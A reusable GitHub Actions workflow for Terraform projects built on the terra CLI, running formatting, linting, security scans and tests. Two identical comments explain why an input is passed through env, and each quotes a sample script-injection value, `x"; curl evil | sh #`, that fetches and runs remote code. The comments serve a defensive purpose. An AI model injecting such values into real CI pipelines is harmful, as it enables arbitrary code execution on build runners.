# Terra CLI pipeline — uses the terra CLI (https://github.com/rios0rios0/terra)
# which wraps Terraform and Terragrunt. Provides code check, security, tests,
# and management stages. Delivery is intentionally excluded because it is
# project-specific (plan/apply targets, environment handling, stack ordering).
#
# see the bottom of the file for more information¹
# the parent workflow is responsible for setting up the call events²
on:
  workflow_call:
    inputs:
      pre_script:
        required: false
        type: 'string'
        default: ''
        description: 'Shell commands run before Trivy and Semgrep. Useful for configuring SSH so the Terraform parser can clone private modules referenced via `source = "git@..."`.'
      pipelines_ref:
        required: false
        type: 'string'
        default: ''
        description: 'Optional ref (branch, tag, or SHA) to check out `rios0rios0/pipelines` at when sourcing shared scripts. Defaults to the ref this reusable workflow was invoked with (parsed from `github.workflow_ref`), so scripts and workflow stay version-locked when consumers pin to a tag/SHA.'

jobs:
  # first stage
  code_check-basic_checks:
    name: 'code-check > quality:basic-checks'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/10-code-check/basic-checks@main'
        with:
          target_branch: ${{ github.event.pull_request.base.ref || github.event.repository.default_branch || 'main' }}
    if: "github.event_name == 'pull_request'"

  code_check-style_terra_format:
    name: 'code-check > style:terra-format'
    runs-on: 'ubuntu-latest'
    steps:
      - name: 'Checkout code'
        uses: 'actions/checkout@v6'

      - name: 'Setup Go'
        uses: 'actions/setup-go@v6'
        with:
          go-version: '1.24'

      - name: 'Install terra CLI'
        run: |
          curl -fsSL https://raw.githubusercontent.com/rios0rios0/terra/main/install.sh | sh
          terra install
        shell: 'bash'

      - name: 'Check formatting'
        run: |
          terra format
          git diff --exit-code
        shell: 'bash'
    if: "!startsWith(github.ref, 'refs/tags/')"

  code_check-style_tflint:
    name: 'code-check > style:tflint'
    runs-on: 'ubuntu-latest'
    steps:
      - name: 'Checkout code'
        uses: 'actions/checkout@v6'

      - name: 'Install TFLint'
        run: curl -s https://raw.githubusercontent.com/terraform-linters/tflint/master/install_linux.sh | bash
        shell: 'bash'

      - name: 'Run TFLint'
        run: tflint --chdir . --recursive
        shell: 'bash'
    continue-on-error: true
    if: "!startsWith(github.ref, 'refs/tags/')"


  # second stage
  security-sast_codeql:
    name: 'security > sast:codeql'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/20-security/codeql@main'
        with:
          codeql_language: 'hcl'
    needs: [ 'code_check-style_terra_format' ]
    continue-on-error: true
    if: "!startsWith(github.ref, 'refs/tags/')"

  security-sast_semgrep:
    name: 'security > sast:semgrep'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/20-security/docker-semgrep@main'
        with:
          semgrep_lang: 'terraform'
          pre_script: ${{ inputs.pre_script }}
    needs: [ 'code_check-style_terra_format' ]
    if: "!startsWith(github.ref, 'refs/tags/')"

  security-sast_gitleaks:
    name: 'security > sast:gitleaks'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/20-security/docker-gitleaks@main'
    needs: [ 'code_check-style_terra_format' ]
    if: "!startsWith(github.ref, 'refs/tags/')"

  security-sast_hadolint:
    name: 'security > sast:hadolint'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/20-security/hadolint@main'
    needs: [ 'code_check-style_terra_format' ]
    continue-on-error: true
    if: "!startsWith(github.ref, 'refs/tags/')"

  security-sast_trivy:
    name: 'security > sast:trivy'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/20-security/trivy@main'
        with:
          pre_script: ${{ inputs.pre_script }}
    needs: [ 'code_check-style_terra_format' ]
    continue-on-error: true
    if: "!startsWith(github.ref, 'refs/tags/')"

  security-sca_trivy:
    name: 'security > sca:trivy'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/20-security/trivy-sca@main'
    needs: [ 'code_check-style_terra_format' ]
    continue-on-error: true
    if: "!startsWith(github.ref, 'refs/tags/')"


  # third stage
  # Single unified job that orchestrates both tiers of Terraform testing
  # behind one `test:all` entry: native `terraform test` over
  # `modules/*/tests/*.tftest.hcl` (tier 1) followed by the Go Terratest
  # suite under `tests/terratest/` (tier 2). The runner auto-detects which
  # tiers the consumer has, runs only those, and exits 0 when neither is
  # present — so stack-only repos (no `modules/` tests, no `tests/terratest/`)
  # pass the stage without a bespoke opt-out.
  tests-test_all:
    name: 'tests > test:all'
    runs-on: 'ubuntu-latest'
    env:
      REPORT_PATH: 'build/reports'
    steps:
      - name: 'Checkout code'
        uses: 'actions/checkout@v6'

      # Mirror the `go-version-file: 'go.mod'` pattern used by every
      # `github/golang/stages/**/action.yaml` in this repo: derive the Go
      # version from the consumer's `tests/terratest/go.mod` (honoring the
      # `TESTS_DIR` env override, same contract as the tier runners) so the
      # toolchain tracks whatever the consumer's Terratest suite declares.
      # Falls back to a conservative `1.24` pin when no terratest `go.mod`
      # exists (stack-only repos with only `modules/*/tests/*.tftest.hcl`,
      # or repos with no Terra tests at all) — `setup-go` errors out when
      # `go-version-file` points at a missing file.
      - name: 'Detect terratest go.mod'
        id: 'terratest-gomod'
        shell: 'bash'
        run: |
          tests_dir="${TESTS_DIR:-tests/terratest}"
          if [ -f "${tests_dir}/go.mod" ]; then
            echo "path=${tests_dir}/go.mod" >> "$GITHUB_OUTPUT"
          else
            echo "path=" >> "$GITHUB_OUTPUT"
          fi

      - name: 'Setup Go (from terratest go.mod)'
        if: "steps.terratest-gomod.outputs.path != ''"
        uses: 'actions/setup-go@v6'
        with:
          go-version-file: ${{ steps.terratest-gomod.outputs.path }}

      - name: 'Setup Go (fallback when no terratest go.mod)'
        if: "steps.terratest-gomod.outputs.path == ''"
        uses: 'actions/setup-go@v6'
        with:
          go-version: '1.24'

      - name: 'Install terra CLI'
        run: |
          curl -fsSL https://raw.githubusercontent.com/rios0rios0/terra/main/install.sh | sh
          terra install
        shell: 'bash'

      # Derive the pipelines ref from the reusable workflow's own invocation
      # ref so the shared scripts stay in sync with the workflow. When the
      # consumer calls `uses: 'rios0rios0/pipelines/.github/workflows/terra.yaml@v4.6.2'`,
      # `github.workflow_ref` resolves to
      # `rios0rios0/pipelines/.github/workflows/terra.yaml@refs/tags/v4.6.2`;
      # stripping everything up to the last `@` yields the ref that
      # `actions/checkout` accepts. The `pipelines_ref` input overrides this
      # for consumers who deliberately want a different script version.
      # Pass `inputs.pipelines_ref` via the step's `env:` mapping rather
      # than interpolating `${{ }}` directly into the `run:` script. The
      # `${{ }}` form is substituted into the shell command at YAML-parse
      # time, so a consumer who passes `pipelines_ref: 'x"; curl evil | sh #'`
      # would inject arbitrary shell. With `env:`, the value is exposed
      # through a process env var the shell only *expands* at runtime,
      # breaking the injection path. Flagged by SonarCloud rule
      # `GitHub Actions should not be vulnerable to script injections`.
      - name: 'Resolve pipelines ref'
        id: 'pipelines-ref'
        shell: 'bash'
        env:
          PIPELINES_REF: ${{ inputs.pipelines_ref }}
        run: |
          if [ -n "${PIPELINES_REF}" ]; then
            ref="${PIPELINES_REF}"
          else
            ref="${GITHUB_WORKFLOW_REF##*@}"
          fi
          echo "ref=${ref}" >> "$GITHUB_OUTPUT"

      - name: 'Checkout pipelines repo for shared scripts'
        uses: 'actions/checkout@v6'
        with:
          repository: 'rios0rios0/pipelines'
          ref: ${{ steps.pipelines-ref.outputs.ref }}
          path: '.pipelines'

      - name: 'Run Terraform tests (terra-test + terratest)'
        run: |
          export SCRIPTS_DIR="$GITHUB_WORKSPACE/.pipelines"
          "$SCRIPTS_DIR/global/scripts/languages/terraform/test-all/run.sh"
        shell: 'bash'

      - name: 'Publish test results'
        if: 'always()'
        uses: 'actions/upload-artifact@v7'
        with:
          name: 'terra-coverage'
          path: "${{ env.REPORT_PATH }}"
          if-no-files-found: 'warn'
    needs: [ 'security-sast_semgrep', 'security-sast_gitleaks', 'security-sast_hadolint', 'security-sast_trivy', 'security-sca_trivy' ]
    if: "!startsWith(github.ref, 'refs/tags/')"

  # Third tier — repo-convention assertions the consumer owns. Runs
  # `tests/structural.sh` if it exists and uploads the resulting JUnit.
  # The script itself is deliberately not shipped upstream; every repo
  # has its own conventions (customer dir naming, bootstrap self-
  # containedness, shared root.hcl presence) that can't live in a shared
  # template. Skipped silently when the consumer has no structural
  # script. Runs in parallel with `tests-test_all` — the shell tier is
  # offline and deps-free, no reason to queue behind the heavier tests.
  tests-test_structural:
    name: 'tests > test:structural'
    runs-on: 'ubuntu-latest'
    env:
      REPORT_PATH: 'build/reports'
    steps:
      - name: 'Checkout code'
        uses: 'actions/checkout@v6'

      # Pass `inputs.pipelines_ref` via the step's `env:` mapping rather
      # than interpolating `${{ }}` directly into the `run:` script. The
      # `${{ }}` form is substituted into the shell command at YAML-parse
      # time, so a consumer who passes `pipelines_ref: 'x"; curl evil | sh #'`
      # would inject arbitrary shell. With `env:`, the value is exposed
      # through a process env var the shell only *expands* at runtime,
      # breaking the injection path. Flagged by SonarCloud rule
      # `GitHub Actions should not be vulnerable to script injections`.
      - name: 'Resolve pipelines ref'
        id: 'pipelines-ref'
        shell: 'bash'
        env:
          PIPELINES_REF: ${{ inputs.pipelines_ref }}
        run: |
          if [ -n "${PIPELINES_REF}" ]; then
            ref="${PIPELINES_REF}"
          else
            ref="${GITHUB_WORKFLOW_REF##*@}"
          fi
          echo "ref=${ref}" >> "$GITHUB_OUTPUT"

      - name: 'Checkout pipelines repo for shared scripts'
        uses: 'actions/checkout@v6'
        with:
          repository: 'rios0rios0/pipelines'
          ref: ${{ steps.pipelines-ref.outputs.ref }}
          path: '.pipelines'

      - name: 'Run structural tests'
        run: |
          export SCRIPTS_DIR="$GITHUB_WORKSPACE/.pipelines"
          "$SCRIPTS_DIR/global/scripts/languages/terraform/structural/run.sh"
        shell: 'bash'

      - name: 'Publish structural JUnit'
        if: 'always()'
        uses: 'actions/upload-artifact@v7'
        with:
          name: 'structural-results'
          path: "${{ env.REPORT_PATH }}/junit-structural.xml"
          if-no-files-found: 'ignore'
    needs: [ 'security-sast_semgrep', 'security-sast_gitleaks', 'security-sast_hadolint', 'security-sast_trivy', 'security-sca_trivy' ]
    if: "!startsWith(github.ref, 'refs/tags/')"


# 1 - this file MUST be inside ".github/workflows" because of GitHub Actions limitations
# 2 - the recommended events to trigger this workflow and permissions are:
#   on:
#     push:
#       branches:
#         - 'main'
#       tags:
#         - '*'
#     pull_request:
#       branches:
#         - 'main'
